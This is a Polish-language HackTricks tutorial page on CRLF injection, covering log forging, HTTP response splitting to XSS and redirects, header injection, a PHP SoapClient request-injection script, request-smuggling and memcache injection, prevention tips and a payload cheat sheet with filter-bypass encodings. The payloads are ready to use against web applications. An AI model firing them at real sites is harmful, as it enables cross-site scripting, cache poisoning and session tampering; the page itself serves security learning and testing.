# Wstrzykiwanie CRLF (%0D%0A)

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Jeśli interesuje Cię **kariera hakerska** i hakowanie niemożliwego do zhakowania - **zatrudniamy!** (_wymagane biegłe posługiwanie się językiem polskim w mowie i piśmie_).

{% embed url="https://www.stmcyber.com/careers" %}

### Wstrzykiwanie CRLF

Carriage Return (CR) i Line Feed (LF), znane jako CRLF, to specjalne sekwencje znaków używane w protokole HTTP do oznaczania końca linii lub początku nowej. Serwery internetowe i przeglądarki używają CRLF do rozróżnienia między nagłówkami HTTP a treścią odpowiedzi. Te znaki są powszechnie stosowane w komunikacji HTTP/1.1 na różnych typach serwerów internetowych, takich jak Apache i Microsoft IIS.

### Podatność na wstrzykiwanie CRLF

Wstrzykiwanie CRLF polega na wstawianiu znaków CR i LF do wprowadzanych przez użytkownika danych. Ta czynność wprowadza w błąd serwer, aplikację lub użytkownika, sugerując, że wstrzyknięta sekwencja jest końcem jednej odpowiedzi i początkiem kolejnej. Chociaż te znaki nie są w sobie szkodliwe, ich niewłaściwe użycie może prowadzić do podziału odpowiedzi HTTP i innych złośliwych działań.

### Przykład: Wstrzykiwanie CRLF w pliku dziennika

[Przykład stąd](https://www.invicti.com/blog/web-security/crlf-http-header/)

Rozważmy plik dziennika w panelu administratora, który ma format: `IP - Czas - Odwiedzona ścieżka`. Typowy wpis może wyglądać tak:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Atakujący może wykorzystać wstrzyknięcie CRLF do manipulacji tym dziennikiem. Poprzez wstrzyknięcie znaków CRLF do żądania HTTP, atakujący może zmieniać strumień wyjściowy i tworzyć fałszywe wpisy w dzienniku. Na przykład, wstrzyknięta sekwencja może przekształcić wpis w dzienniku w:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Oto, `%0d` i `%0a` reprezentują zakodowane w formacie URL CR i LF. Po ataku, dziennik wyświetliłby myląco:
```
IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Atakujący maskuje swoje złośliwe działania, sprawiając, że wydaje się, jakby działania te zostały wykonane przez lokalny host (jednostkę zwykle uznawaną za zaufaną w środowisku serwera). Serwer interpretuje część zapytania rozpoczynającą się od `%0d%0a` jako pojedynczy parametr, podczas gdy parametr `restrictedaction` jest analizowany jako inny, oddzielny wejście. Zmanipulowane zapytanie efektywnie udaje prawidłowe polecenie administracyjne: `/index.php?page=home&restrictedaction=edit`


### Podział odpowiedzi HTTP (HTTP Response Splitting)

#### Opis

Podział odpowiedzi HTTP (HTTP Response Splitting) to podatność na zabezpieczenia, która pojawia się, gdy atakujący wykorzystuje strukturę odpowiedzi HTTP. Ta struktura oddziela nagłówki od treści za pomocą określonej sekwencji znaków: powrotu karetki (CR) po którym następuje podział wiersza (LF), łącznie określane jako CRLF. Jeśli atakujący jest w stanie wstawić sekwencję CRLF do nagłówka odpowiedzi, może efektywnie manipulować treścią kolejnej odpowiedzi. Tego rodzaju manipulacja może prowadzić do poważnych problemów związanych z bezpieczeństwem, zwłaszcza Cross-site Scripting (XSS).

#### XSS poprzez podział odpowiedzi HTTP (HTTP Response Splitting)

1. Aplikacja ustawia niestandardowy nagłówek w ten sposób: `X-Custom-Header: UserInput`
2. Aplikacja pobiera wartość dla `UserInput` z parametru zapytania, powiedzmy "user_input". W przypadkach braku odpowiedniej walidacji i kodowania danych wejściowych, atakujący może stworzyć payload, który zawiera sekwencję CRLF, a następnie złośliwą treść.
3. Atakujący tworzy adres URL z specjalnie spreparowanym 'user_input': `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
- W tym adresie URL `%0d%0a%0d%0a` to zakodowana w formie URL sekwencja CRLFCRLF. Przez to serwer zostaje oszukany i wstawia sekwencję CRLF, co powoduje, że serwer traktuje kolejną część jako treść odpowiedzi.
4. Serwer odzwierciedla wprowadzone przez atakującego dane wejściowe w nagłówku odpowiedzi, co prowadzi do niezamierzonej struktury odpowiedzi, w której złośliwy skrypt jest interpretowany przez przeglądarkę jako część treści odpowiedzi.

#### Przykład podziału odpowiedzi HTTP (HTTP Response Splitting) prowadzący do przekierowania

Z [https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)

Przeglądarka do:
```
/%0d%0aLocation:%20http://myweb.com
```
I serwer odpowiada nagłówkiem:
```
Location: http://myweb.com
```
**Inny przykład: (z** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### W ścieżce URL

Możesz wysłać ładunek **wewnątrz ścieżki URL** w celu kontrolowania **odpowiedzi** serwera (przykład z [tutaj](https://hackerone.com/reports/192667)):
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
Sprawdź więcej przykładów na:

{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### Wstrzykiwanie Nagłówków HTTP

Wstrzykiwanie Nagłówków HTTP, często wykorzystywane za pomocą wstrzykiwania CRLF (Carriage Return and Line Feed), pozwala atakującym wstawić nagłówki HTTP. Może to osłabić mechanizmy bezpieczeństwa, takie jak filtry XSS (Cross-Site Scripting) lub SOP (Same-Origin Policy), co potencjalnie prowadzi do nieautoryzowanego dostępu do wrażliwych danych, takich jak tokeny CSRF, lub manipulacji sesjami użytkowników poprzez wstrzykiwanie plików cookie.

#### Wykorzystywanie CORS za pomocą Wstrzykiwania Nagłówków HTTP

Atakujący może wstrzyknąć nagłówki HTTP, aby umożliwić CORS (Cross-Origin Resource Sharing), omijając ograniczenia narzucone przez SOP. To naruszenie pozwala skryptom z złośliwych źródeł na interakcję z zasobami z innego źródła, potencjalnie uzyskując dostęp do chronionych danych.

#### SSRF i Wstrzykiwanie Żądań HTTP za pomocą CRLF

Wstrzykiwanie CRLF może być wykorzystane do stworzenia i wstrzyknięcia zupełnie nowego żądania HTTP. Znaczącym przykładem tego jest podatność w klasie `SoapClient` w PHP, konkretnie w parametrze `user_agent`. Poprzez manipulację tym parametrem, atakujący może wstawić dodatkowe nagłówki i treść ciała, lub nawet wstrzyknąć zupełnie nowe żądanie HTTP. Poniżej znajduje się przykład w PHP, demonstrujący to wykorzystanie:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```
### Wstrzykiwanie nagłówków w celu przeprowadzenia Request Smuggling

Aby uzyskać więcej informacji na temat tej techniki i potencjalnych problemów, [**sprawdź oryginalne źródło**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

Możesz wstrzyknąć niezbędne nagłówki, aby zapewnić, że **serwer zachowa otwarte połączenie** po odpowiedzi na początkowe żądanie:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Następnie można określić drugie żądanie. Ten scenariusz zwykle obejmuje [smuglowanie żądań HTTP](http-request-smuggling/), technikę, w której dodatkowe nagłówki lub elementy ciała dodane przez serwer po wstrzyknięciu mogą prowadzić do różnych ataków bezpieczeństwa.

**Eksploatacja:**

1. **Zatrucie żądaniem złośliwego prefiksu**: Ta metoda polega na zatruciu żądania następnego użytkownika lub pamięci podręcznej sieciowej poprzez określenie złośliwego prefiksu. Przykładem może być:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

2. **Tworzenie prefiksu do zatrucia kolejki odpowiedzi**: Ta metoda polega na stworzeniu prefiksu, który w połączeniu z końcowymi niepotrzebnymi danymi tworzy kompletną drugą prośbę. Może to spowodować zatrucie kolejki odpowiedzi. Przykładem jest:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

### Wstrzykiwanie Memcache

Memcache to **sklep klucz-wartość, który używa protokołu tekstowego**. Więcej informacji można znaleźć tutaj:

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

**Aby uzyskać pełne informacje, przeczytaj**[ **oryginalny opis**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)

Jeśli platforma pobiera **dane z żądania HTTP i używa ich bez oczyszczania** do wykonywania **żądań** do serwera **memcache**, atakujący może wykorzystać to zachowanie do **wstrzykiwania nowych poleceń memcache**.

Na przykład, w oryginalnie odkrytej podatności, klucze pamięci podręcznej były używane do zwracania adresu IP i portu, do którego użytkownik powinien się podłączyć, a atakujący byli w stanie **wstrzykiwać polecenia memcache**, które **zatruciły** pamięć podręczną, wysyłając dane ofiar (w tym nazwy użytkowników i hasła) do serwerów atakującego:

<figure><img src="../.gitbook/assets/image (6) (1) (4).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&h=178&auto=format&fit=crop"><figcaption></figcaption></figure>

Ponadto, badacze odkryli również, że mogą dezynchronizować odpowiedzi memcache, aby wysyłać adresy IP i porty atakujących do użytkowników, których adresu e-mail atakujący nie znał:

<figure><img src="../.gitbook/assets/image (40).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&h=506&auto=format&fit=crop"><figcaption></figcaption></figure>

### Jak zapobiegać wstrzykiwaniu CRLF / nagłówków HTTP w aplikacjach internetowych

Aby zmniejszyć ryzyko wstrzykiwania CRLF (powrót karetki i nowa linia) lub nagłówków HTTP w aplikacjach internetowych, zaleca się zastosowanie następujących strategii:

1. **Unikaj bezpośredniego wprowadzania danych użytkownika do nagłówków odpowiedzi:**
Najbezpieczniejszym podejściem jest powstrzymanie się od bezpośredniego uwzględniania dostarczonych przez użytkownika danych w nagłówkach odpowiedzi.

2. **Koduj specjalne znaki:**
Jeśli niemożliwe jest uniknięcie bezpośredniego wprowadzania danych użytkownika, należy użyć funkcji dedykowanej do kodowania specjalnych znaków, takich jak CR (powrót karetki) i LF (nowa linia). Zapobiega to możliwości wstrzyknięcia CRLF.

3. **Aktualizuj język programowania:**
Regularnie aktualizuj używany w aplikacjach internetowych język programowania do najnowszej wersji. Wybierz wersję, która domyślnie nie zezwala na wstrzyknięcie znaków CR i LF w funkcjach odpowiedzialnych za ustawianie nagłówków HTTP.


### CHEAT SHEET

[Cheatsheet dostępny tutaj](https://twitter.com/NinadMishra5/status/1650080604174667777)
```
1. HTTP Response Splitting
• /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
• //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
• /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
• /google.com/%2F..%0D%0AHeader-Test:test2
• /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
• /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
• /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
• %E5%98%8A = %0A = \u560a
• %E5%98%8D = %0D = \u560d
• %E5%98%BE = %3E = \u563e (>)
• %E5%98%BC = %3C = \u563c (<)
• Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Automatyczne narzędzia

* [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
* [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## Lista wykrywania Brute-Force

* [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt)

## Referencje
* [**https://www.invicti.com/blog/web-security/crlf-http-header/**](https://www.invicti.com/blog/web-security/crlf-http-header/)
* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
* [**https://www.netsparker.com/blog/web-security/crlf-http-header/**](https://www.netsparker.com/blog/web-security/crlf-http-header/)

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Jeśli jesteś zainteresowany **karierą w dziedzinie hakowania** i chcesz zhakować to, co nie do zhakowania - **zatrudniamy!** (_wymagane biegłe posługiwanie się językiem polskim w mowie i piśmie_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
